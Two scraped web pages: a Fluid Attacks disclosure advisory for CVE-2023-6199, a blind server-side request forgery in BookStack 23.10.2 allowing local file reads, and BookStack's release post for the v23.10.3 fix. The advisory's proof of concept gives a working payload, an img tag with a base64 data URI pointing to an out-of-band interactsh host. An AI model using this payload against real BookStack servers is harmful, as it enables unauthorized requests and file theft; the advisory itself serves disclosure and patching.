=== Content from fluidattacks.com_70431af4_20250114_232214.html ===
[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# Book Stack v23.10.2 - LFR via Blind SSRF

## Summary

|  |  |
| --- | --- |
| **Name** | Book Stack v23.10.2 - LFR via Blind SSRF |
| **Code name** | [Imagination](https://en.wikipedia.org/wiki/Imagination_%28band%29) |
| **Product** | Book Stack |
| **Affected versions** | Version 23.10.2 |
|
| **State** | Public |
| **Release date** | 2023-11-20 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Server-side request forgery (SSRF) |
| **Rule** | [100. Server-side request forgery (SSRF)](https://docs.fluidattacks.com/criteria/vulnerabilities/100/) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N |
| **CVSSv3.1 Base Score** | 7.1 |
| **Exploit available** | No |
| **CVE ID(s)** | [CVE-2023-6199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6199) |

## Description

Book Stack version 23.10.2 allows filtering local files on the server.
This is possible because the application is vulnerable to SSRF.

## Vulnerability

A server-side request forgery (SSRF) vulnerability has been identified
in Book Stack that, under certain conditions, could allow an attacker to
obtain local files from the server. The attacker must have writer permissions.

## POC

```
<!--
 1. OOB

 interactsh-client -v
 => clc2nf2q8vb4audkj6ngndxkxg7c7y1pj.oast.site

 2. Craft Payload

 https://clc2nf2q8vb4audkj6ngndxkxg7c7y1pj.oast.site/image.png | base64
 => aHR0cHM6Ly9jbGMybmYycTh2YjRhdWRrajZuZ25keGt4ZzdjN3kxcGoub2FzdC5zaXRlL2ltYWdlLnBuZw

 3. Exploit

 => <img src='data:image/png;base64,[BASE64 HERE]'/>
-->
<img src='data:image/png;base64,aHR0cHM6Ly9jbGMybmYycTh2YjRhdWRrajZuZ25keGt4ZzdjN3kxcGoub2FzdC5zaXRlL2ltYWdlLnBuZw'/>

```
## Evidence of exploitation

## Our security policy

We have reserved the ID CVE-2023-6199 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: Book Stack 23.10.2
* Operating System: MacOS

## Mitigation

An updated version of BookStack is available at the vendor page.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/BookStackApp/BookStack/>

**BookStack release** <https://www.bookstackapp.com/blog/bookstack-release-v23-10-3/>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-11-17

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-11-18

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-11-19

Vendor replied acknowledging the report.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-11-19

Vendor Confirmed the vulnerability.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-11-20

Vulnerability patched.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-11-20

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)



=== Content from www.bookstackapp.com_9b5a8b1e_20250114_232214.html ===

[BookStack](https://www.bookstackapp.com/)

Platform
[Features

An overview of the core features of BookStack](/#features)
[Demo

Give BookStack a test drive on our demo instance](/#demo)
[Documentation

Guidance for managing and using BookStack](/docs)
[Our Blog

Get the latest project news from our blog](/blog)
[Hacks

Unsupported hacks that can be applied](/hacks)

[Support](/support)
[Documentation

Get support from our user and admin documentation](/docs)
[Support Plans

See our range of support plans for BookStack](/support)
[Donate

Provide financial support to the project](/donate)
[Videos on PeerTube

Find our video guides on the fediverse.](https://foss.video/c/bookstack/)
[Guides on YouTube

Watch our video guides on YouTube](https://www.youtube.com/c/BookStackApp)
[GitHub Issues

Find or report issues on the GitHub project](https://github.com/BookStackApp/BookStack/issues)

Community
[GitHub

Star the project on GitHub and follow us](https://github.com/BookStackApp/BookStack)
[Codeberg

Watch development and get involved](https://codeberg.org/bookstack/)
[Discord

Chat with the development team and other users](https://discord.gg/ztkBqR2)
[Mastodon

Follow the project on Mastodon](https://fosstodon.org/%40bookstack)
[YouTube

Watch and comment on our YouTube videos](https://www.youtube.com/c/BookStackApp)
[Reddit

Join our community on the BookStack subreddit](https://www.reddit.com/r/bookstack)
[Our Blog

Keep up with the latest developments via our blog](/blog)

# BookStack Security Release v23.10.3

![Dan Brown](/images/dan.jpg) Dan Brown posted on the 20th of November 2023

BookStack v23.10.3 has been released.
This is a security release that addresses a vulnerability in image handling which could be
exploited to perform server-side requests or read the contents of files on the server system.
Additionally, this update addresses a lack of permission check in some image creation actions.

Upgrade is strongly advised where untrusted users have permission to create/edit/update page
content in your instance.

* [Update instructions](https://www.bookstackapp.com/docs/admin/updates)
* [GitHub release page](https://github.com/BookStackApp/BookStack/releases/tag/v23.10.3)

Thanks to [Carlos Bello](https://www.linkedin.com/in/carlos-andres-bello/) from the
[Fluid Attacks](https://fluidattacks.com/) Research Team for discovering and reporting
this vulnerability.

### Full List of Changes

* Updated thumbnail handling to for use of content as image data. ([#4681](https://github.com/BookStackApp/BookStack/pull/4681))

### For More Information

If you have any questions or comments about this advisory:

* Open an issue in [the BookStack GitHub repository](https://github.com/BookStackApp/BookStack/issues).
* Ask on the [BookStack Discord chat](https://discord.gg/ztkBqR2).
* Follow the [BookStack security policy](https://github.com/BookStackApp/BookStack/blob/development/.github/SECURITY.md) to contact someone privately.

---

Header Image Credits: Photo by [Mitchell Orr](https://unsplash.com/%40mitchorr?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash) on [Unsplash](https://unsplash.com/photos/squirrel-on-wooden-fence-42ApCULIolY?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash)

Want to let me know what you think of BookStack or this post?

You can find me on Mastodon [@danb@fosstodon.org](https://fosstodon.org/%40danb) or on the [BookStack Discord server](https://discord.gg/ztkBqR2).

#### Subscribe to Updates

There are two lists you can sign-up to for updates, A general news & updates list, sent on a weekly basis, and a security alerts list
that's sent when new security updates are available.

[News and Updates](https://updates.bookstackapp.com/signup/bookstack-news-and-updates)
|
[Security Alerts](https://updates.bookstackapp.com/signup/bookstack-security-updates)

#### Latest Posts

[##### BookStack in 2024

6 Jan 2025](https://www.bookstackapp.com/blog/bookstack-in-2024/)
[##### BookStack Release v24.12

23 Dec 2024](https://www.bookstackapp.com/blog/bookstack-release-v24-12/)
[##### BookStack Security Release v24.10.2

13 Nov 2024](https://www.bookstackapp.com/blog/bookstack-release-v24-10-2/)
[##### BookStack Release v24.10

9 Oct 2024](https://www.bookstackapp.com/blog/bookstack-release-v24-10/)
[##### BookStack Project Update for September 2024

12 Sep 2024](https://www.bookstackapp.com/blog/project-update-september-24/)
[##### BookStack Security Release v24.05.4

29 Aug 2024](https://www.bookstackapp.com/blog/bookstack-release-v24-05-4/)
[##### Nine Years of BookStack

12 Jul 2024](https://www.bookstackapp.com/blog/9-years-of-bookstack/)
[##### BookStack Security Release v24.05.1

21 May 2024](https://www.bookstackapp.com/blog/bookstack-release-v24-05-1/)

BookStack - Created By [Dan Brown](https://danb.me "danb.me") and developed with the [community](https://github.com/BookStackApp/BookStack/graphs/contributors).
Page generated with [hugo](https://gohugo.io), Site source can be found [here on Codeberg](https://codeberg.org/bookstack/website).

This website uses a self-hosted instance of [Plausible](https://plausible.io/) for analytics.
Our site stats can [be viewed here](https://analytics.bookstackapp.com/bookstackapp.com).
We also use a customized version of [webidx](https://github.com/gbxyz/webidx/) for search capabilities.

BookStack® is a registered trade mark of Daniel Brown.

Copyright 2015-2025 Dan Brown.

##### On the site

* [Documentation](https://www.bookstackapp.com/docs)
* [Our Features](https://www.bookstackapp.com/#features)
* [View the Demo](https://www.bookstackapp.com/#demo)
* [Read our Blog](https://www.bookstackapp.com/blog)
* [Donate](https://www.bookstackapp.com/donate)
* [Hacks](https://www.bookstackapp.com/hacks)

##### Follow us

* [Codeberg](https://codeberg.org/bookstack/)
* [Github](https://github.com/BookStackApp/BookStack)
* [Discord](https://discord.gg/ztkBqR2)
* [Mastodon](https://fosstodon.org/%40bookstack)
* [PeerTube](https://foss.video/c/bookstack/)
* [YouTube](https://www.youtube.com/c/BookStackApp)
* [Reddit](https://www.reddit.com/r/bookstack)

##### Information

* [Project FAQ](/about/project-faq/)
* [Our Support Services](/support/)
* [BookStack in the Media](/about/in-the-media/)
* [Alternative Open Source Options](/about/bookstack-alternatives/)
* [A Confluence Alternative](/about/confluence-alternative/)
* [Microsoft Teams Wiki Alternative](/about/teams-wiki-alternative/)
* [Open Source Documentation Software](/about/open-source-documentation-software/)


